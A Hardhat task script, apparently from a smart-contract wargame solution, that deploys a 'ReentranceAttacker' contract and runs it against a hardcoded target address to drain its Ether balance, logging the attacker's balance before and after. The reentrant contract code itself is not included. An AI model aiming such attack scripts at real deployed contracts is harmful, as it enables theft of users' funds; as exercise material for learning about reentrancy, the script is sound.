import { task } from 'hardhat/config';
import { TaskArguments } from 'hardhat/types';

import { ReentranceAttacker } from '../../src/types';
import { deploy, logBalance, logTransaction } from './utils';

const TARGET = '0x715D81ea3dc8DC20a627f7aBBc286e9827ed1BC2';

task('deploy:Reentrance').setAction(async function (_: TaskArguments, hre) {
  const { ethers } = hre;
  const [signer] = await ethers.getSigners();

  const initialBalance = await ethers.provider.getBalance(TARGET);
  if (!initialBalance.gt(0)) {
    throw new Error('missing params');
  }

  console.log(
    `target initial balance: ${ethers.utils.formatEther(initialBalance)}`,
  );

  const reentranceAttacker = await deploy<ReentranceAttacker>(
    hre,
    'ReentranceAttacker',
    signer,
  );

  await logBalance(hre, signer.address, 'balance before');
  await logTransaction(() =>
    reentranceAttacker
      .connect(signer)
      .execute(TARGET, { value: initialBalance }),
  );
  await logBalance(hre, signer.address, 'balance after');
});
